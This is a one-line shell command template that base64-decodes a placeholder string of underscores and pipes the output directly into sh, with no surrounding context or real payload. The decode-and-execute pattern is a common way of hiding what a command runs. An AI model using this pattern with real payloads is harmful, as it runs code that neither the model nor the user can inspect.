echo '_____________' | base64 -d | sh
